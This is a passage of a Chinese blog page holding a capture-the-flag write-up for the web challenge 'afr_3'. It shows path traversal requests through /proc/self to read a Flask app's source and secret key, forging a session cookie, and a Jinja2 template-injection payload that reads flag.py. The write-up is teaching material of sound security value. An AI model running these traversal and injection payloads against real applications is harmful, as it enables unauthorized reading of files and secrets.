+		data-flex-grow="254"
+		data-flex-basis="611px"
+	
+></p>
+<h1 id="第一章-web入门afr_3">[第一章 web入门]afr_3
+</h1><h2 id="摘自官方wp">摘自官方wp
+</h2><p>本题考查对linux系统中/proc/目录下文件作用的了解，同时考查了flask模板注入</p>
+<ol>
+<li>请求 http://IP:PORT/article?name=../../../../../proc/self/cmdline获取当前执行系统命令，得到</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python server.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol>
+<li>请求 http://IP:PORT/article?name=../../../../../proc/self/cwd/server.py获取源码</li>
+<li>审计源码，发现flag在flag.py,flask的appkey在key.py,但是此处任意文件读取漏洞被过滤了关键词flag</li>
+<li>源码里存在flask SSTI，前提是可以伪造flask的cookie，这里需要用到appkey <a class="link" href="https://noraj.github.io/flask-session-cookie-manager/"  target="_blank" rel="noopener"
+    >https://noraj.github.io/flask-session-cookie-manager/</a></li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/n1page&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="s2">&#34;POST&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">n1page</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">!=</span> <span class="s2">&#34;POST&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s2">&#34;index&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">n1code</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;n1code&#34;</span><span class="p">)</span> <span class="ow">or</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">n1code</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">n1code</span> <span class="o">=</span> <span class="n">n1code</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;_&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;{&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;}&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;n1code&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">session</span> <span class="ow">or</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;n1code&#39;</span><span class="p">]</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">session</span><span class="p">[</span><span class="s1">&#39;n1code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">n1code</span>
+</span></span><span class="line"><span class="cl">    <span class="n">template</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;n1code&#39;</span><span class="p">]</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">     <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">     这里存在SSTI
+</span></span></span><span class="line"><span class="cl"><span class="s1">     &#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">template</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;&lt;h1&gt;N1 Page&lt;/h1&gt; &lt;div class=&#34;row&gt; &lt;div class=&#34;col-md-6 col-md-offset-3 center&#34;&gt; Hello : </span><span class="si">%s</span><span class="s1">, why you don&#39;t look at our &lt;a href=&#39;/article?name=article&#39;&gt;article&lt;/a&gt;? &lt;/div&gt; &lt;/div&gt; &#39;&#39;&#39;</span> <span class="o">%</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;n1code&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">session</span><span class="p">[</span><span class="s1">&#39;n1code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以请求 http://IP:PORT/article?name=../../../../../proc/self/cwd/key.py获取appkey</p>
+<ol>
+<li>伪造cookie为SSTI的payload获取flag.</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;flag.py&#39;).read()}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/%E4%B8%AA%E4%BA%BA%E5%90%91ctf%E6%AF%94%E8%B5%9B%E5%87%BA%E7%9A%84%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E6%B8%B8%E6%88%8F%E9%A2%98gametime%E9%A2%98%E8%A7%A3/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">【个人向】ctf比赛出的一道逆向游戏题——GameTime题解</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/handler%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HANDLER进行堆叠注入</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">CDUT第一届信安大挑战Re-wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/mrctfxor/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">【MRCTF】Xor</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/buu%E7%AE%80%E5%8D%95%E6%B3%A8%E5%86%8C%E5%99%A8/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">【BUU】简单注册器</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src="https://utteranc.es/client.js" 
+        repo="DorinXL/dorinxl.github.io"
+        issue-term="pathname"
+        
+        crossorigin="anonymous"
+        async
+        >
+</script>
+
+<style>
+    .utterances {
+        max-width: unset;
+    }
+</style>
+
+<script>
+    let utterancesLoaded = false;
+
+    function setUtterancesTheme(theme) {
+        let utterances = document.querySelector('.utterances iframe');
+        if (utterances) {
+            utterances.contentWindow.postMessage(
+                {
+                    type: 'set-theme',
+                    theme: `github-${theme}`
+                },
+                'https://utteranc.es'
+            );
+        }
+    }
+
+    addEventListener('message', event => {
+        if (event.origin !== 'https://utteranc.es') return;
+
+        
+        utterancesLoaded = true;
+        setUtterancesTheme(document.documentElement.dataset.scheme)
+    });
+
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (!utterancesLoaded) return;
+        setUtterancesTheme(e.detail)
+    })
+</script>
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2024 荡影-DorinXL
+    </section>
+
+
+
+<section class="totalcount">
+    
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+    发表了76篇文章 · 
+    总计103.89k字
+</section>
+
+
+
+<section class="running-time">
+本博客已稳定运行
+<span id="runningdays" class="running-days"></span>
+</section>
+
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.26.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+<script>
+    let s1 = '2024-8-25'; 
+    s1 = new Date(s1.replace(/-/g, "/"));
+    let s2 = new Date();
+    let timeDifference = s2.getTime() - s1.getTime();
+
+    let days = Math.floor(timeDifference / (1000 * 60 * 60 * 24));
+    let hours = Math.floor((timeDifference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+    let minutes = Math.floor((timeDifference % (1000 * 60 * 60)) / (1000 * 60));
+
+    let result = days + "天" + hours + "小时" + minutes + "分钟";
+    document.getElementById('runningdays').innerHTML = result;
+</script>
+    </body>
+</html>
